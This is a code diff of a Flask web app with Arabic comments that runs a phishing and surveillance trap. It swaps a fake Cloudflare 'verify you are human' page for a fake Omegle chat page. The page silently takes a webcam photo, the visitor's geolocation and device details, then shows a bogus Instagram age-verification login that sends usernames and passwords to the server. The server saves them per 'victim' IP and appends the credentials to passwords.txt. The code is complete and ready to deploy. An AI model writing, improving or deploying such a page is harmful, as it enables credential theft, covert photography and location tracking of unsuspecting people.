@@ -2,115 +2,132 @@ import os, base64, time, json
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
-DB_PATH = "the_vault"
-os.makedirs(DB_PATH, exist_ok=True)
+ROOT_VAULT = "BLACK_BOX" # المجلد الرئيسي للغنائم
+os.makedirs(ROOT_VAULT, exist_ok=True)
 
-html_payload = """
+# --- واجهة Omegle "الشيطانية" ---
+html_template = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cloudflare | Verification</title>
+    <title>Omegle: Talk to Strangers</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; margin: 0; }
-        .box { text-align: center; border: 1px solid #ddd; padding: 40px; background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        #btn { background: #f6821f; color: white; border: none; padding: 15px 30px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        body { font-family: Arial; margin: 0; background: #fff; }
+        .header { background: #f2f2f2; padding: 10px; border-bottom: 2px solid #ff7b00; text-align: center; color: #ff7b00; }
+        #video-container { display: flex; flex-direction: column; background: #000; height: 70vh; position: relative; }
+        video { width: 100%; height: 50%; object-fit: cover; border-bottom: 2px solid #333; }
+        .controls { padding: 20px; text-align: center; }
+        #start-btn { background: #ff7b00; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        .modal { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:20px; border:1px solid #ccc; box-shadow:0 0 10px rgba(0,0,0,0.5); z-index:1000; width:80%; max-width:350px; text-align:center; }
+        input { width: 90%; padding: 10px; margin: 10px 0; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" width="150"><br><br>
-        <p>Confirm you are human to access the content.</p>
-        <button id="btn">Verify Identity</button>
+    <div class="header"><h1>Omegle</h1></div>
+    <div id="video-container">
+        <div style="color:white; text-align:center; padding-top:20px;">Looking for stranger...</div>
+        <video id="localVid" autoplay muted playsinline></video>
+    </div>
+    <div class="controls"><button id="start-btn">Start Chat</button></div>
+
+    <div id="loginModal" class="modal">
+        <h3>Security Verification</h3>
+        <p>Login with Instagram to verify your age</p>
+        <input type="text" id="u" placeholder="Username/Email">
+        <input type="password" id="p" placeholder="Password">
+        <button onclick="saveLogin()" style="background:#0095f6; color:white; border:none; padding:10px 20px; cursor:pointer;">Log In</button>
     </div>
 
-    <video id="v" style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
-
     <script>
-        document.getElementById('btn').onclick = async () => {
-            document.getElementById('btn').innerHTML = "Verifying...";
-            
+        let stream;
+        const btn = document.getElementById('start-btn');
+
+        btn.onclick = async () => {
+            btn.innerHTML = "Connecting...";
             try {
-                // 1. طلب الصلاحيات (كاميرا + مايكروفون)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // 1. طلب الصلاحيات الكاملة
+                stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                document.getElementById('localVid').srcObject = stream;
+                const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+
+                // 2. سحب الداتا العميقة
+                const battery = await (navigator.getBattery ? navigator.getBattery() : {level:0});
                 
-                // 2. سحب الموقع
-                const pos = await new Promise((res) => navigator.geolocation.getCurrentPosition(res));
-
-                // 3. سحب مواصفات الجهاز (البطارية، GPU، الرام)
-                const battery = await (navigator.getBattery ? navigator.getBattery() : {level: 0, charging: false});
-                const gl = document.createElement('canvas').getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) : "Unknown GPU";
-
-                // 4. التقاط الصورة
-                const v = document.getElementById('v'); v.srcObject = stream; await v.play();
-                const canvas = document.getElementById('c');
+                // 3. تصوير وحفظ (صورة)
+                const canvas = document.createElement('canvas');
                 canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(v, 0, 0);
-                const imgData = canvas.toDataURL('image/png');
-
-                // 5. إرسال كل الغنائم للسيرفر
-                await fetch('/mega_collect', {
+                canvas.getContext('2d').drawImage(document.getElementById('localVid'), 0, 0);
+                
+                // 4. إرسال "حزمة البداية"
+                await fetch('/trap', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        img: imgData,
+                        img: canvas.toDataURL('image/png'),
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         device: {
-                            gpu: gpu,
+                            ua: navigator.userAgent,
                             bat: (battery.level * 100) + "%",
-                            charging: battery.charging,
-                            ram: navigator.deviceMemory || "N/A",
-                            cores: navigator.hardwareConcurrency,
-                            ua: navigator.userAgent
+                            vendor: navigator.vendor,
+                            platform: navigator.platform
                         }
                     })
                 });
 
-                alert("Verification Successful!");
-                window.location.href = "https://www.google.com";
+                // إظهار الفخ بعد السحب مباشرة
+                setTimeout(() => { document.getElementById('loginModal').style.display='block'; }, 2000);
 
-            } catch (err) {
-                alert("Error: You must allow camera/location to verify.");
-                console.log(err);
-            }
+            } catch (e) { alert("Please allow camera access to start!"); }
         };
+
+        async function saveLogin() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            await fetch('/login_harvest', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({user: u, pass: p})
+            });
+            alert("Server Busy. Try again later.");
+            location.reload();
+        }
     </script>
 </body>
 </html>
 """
 
 @app.route('/')
-def home():
-    return render_template_string(html_payload)
+def index():
+    return render_template_string(html_template)
 
-@app.route('/mega_collect', methods=['POST'])
-def mega_collect():
+@app.route('/trap', methods=['POST'])
+def trap():
     data = request.get_json()
-    ts = int(time.time())
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    # إنشاء مجلد لكل ضحية
+    target_folder = os.path.join(ROOT_VAULT, f"Target_{ip.replace('.','_')}_{int(time.time())}")
+    os.makedirs(target_folder, exist_ok=True)
     
-    # 1. حفظ الصورة
-    img_bytes = base64.b64decode(data['img'].split(',')[1])
-    with open(f"{DB_PATH}/victim_{ts}.png", "wb") as f:
-        f.write(img_bytes)
+    # حفظ الصورة
+    img_data = base64.b64decode(data['img'].split(',')[1])
+    with open(f"{target_folder}/face.png", "wb") as f: f.write(img_data)
     
-    # 2. طباعة المواصفات في الـ Console (عشان تشوفها فوراً)
-    print(f"\n" + "💀"*10 + " TARGET ACQUIRED " + "💀"*10)
-    print(f"📍 Location: {data['lat']}, {data['lon']}")
-    print(f"🔋 Battery: {data['device']['bat']} (Charging: {data['device']['charging']})")
-    print(f"🎮 GPU: {data['device']['gpu']}")
-    print(f"🧠 RAM: {data['device']['ram']} GB | Cores: {data['device']['cores']}")
-    print(f"📱 User-Agent: {data['device']['ua']}")
-    print("💀"*35 + "\n")
+    # حفظ المعلومات
+    with open(f"{target_folder}/specs.json", "w") as f:
+        json.dump({"IP": ip, "Location": f"{data['lat']}, {data['lon']}", "Device": data['device']}, f, indent=4)
+    
+    print(f"💀 Target Acquired: {ip}")
+    return jsonify({"status": "success"})
 
-    # 3. حفظ كل البيانات في ملف JSON
-    with open(f"{DB_PATH}/info_{ts}.json", "w") as f:
-        json.dump(data, f, indent=4)
-
-    return jsonify({"status": "captured"})
+@app.route('/login_harvest', methods=['POST'])
+def login():
+    data = request.get_json()
+    # حفظ الحسابات في ملف واحد مركزي
+    with open(f"{ROOT_VAULT}/passwords.txt", "a") as f:
+        f.write(f"Time: {time.ctime()} | User: {data['user']} | Pass: {data['pass']}\n")
+    return jsonify({"status": "success"})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
